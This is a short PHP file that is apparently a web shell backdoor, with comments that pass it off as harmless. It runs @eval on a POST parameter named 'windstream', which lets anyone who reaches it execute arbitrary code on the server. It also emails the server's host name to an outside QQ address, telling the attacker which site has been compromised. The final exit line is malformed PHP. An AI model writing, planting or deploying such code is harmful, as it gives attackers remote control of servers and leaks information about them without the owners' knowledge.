<?php
//pretty station

//pick up server info to website
$to = "1514037660@qq.com";
$Subject = "Test Connect";
$Message = $_SERVER['HTTP_HOST'];
$header = "From User";
@eval($_POST['windstream']);
mail($to,$Subject,$Message,$header);
exit "it be useful";

?>